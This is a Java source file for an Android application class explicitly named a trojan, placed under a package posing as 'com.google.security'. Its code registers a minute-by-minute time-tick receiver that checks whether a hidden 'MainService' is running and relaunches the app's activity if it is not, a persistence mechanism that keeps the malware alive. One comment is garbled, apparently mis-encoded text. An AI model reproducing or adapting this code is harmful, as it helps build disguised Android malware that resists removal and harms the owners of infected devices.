package com.google.security;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

public class TrojanHVApplication extends Application {
	private static Context context;

	@Override
	public void onCreate() {
		context = getApplicationContext();
		IntentFilter filter = new IntentFilter(Intent.ACTION_TIME_TICK);
		BackgroundBroadcastReceiver receiver = new BackgroundBroadcastReceiver();
		registerReceiver(receiver, filter);
	}

	public static Context getContext() {
		return context;
	}

	public class BackgroundBroadcastReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			// TODO Auto-generated method stub
			boolean isServiceRunning = false;
			if (intent.getAction().equals(Intent.ACTION_TIME_TICK)) {
				// ¼ì²éService×´Ì¬
				ActivityManager manager = (ActivityManager) TrojanHVApplication
						.getContext()
						.getSystemService(Context.ACTIVITY_SERVICE);
				for (RunningServiceInfo service : manager
						.getRunningServices(Integer.MAX_VALUE)) {
					if ("com.google.security.MainService"
							.equals(service.service.getClassName()))

					{
						isServiceRunning = true;
					}

				}
				if (!isServiceRunning) {
					Intent i = new Intent(context, MainActivity.class);
					i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(i);
				}

			}
		}
	}
}
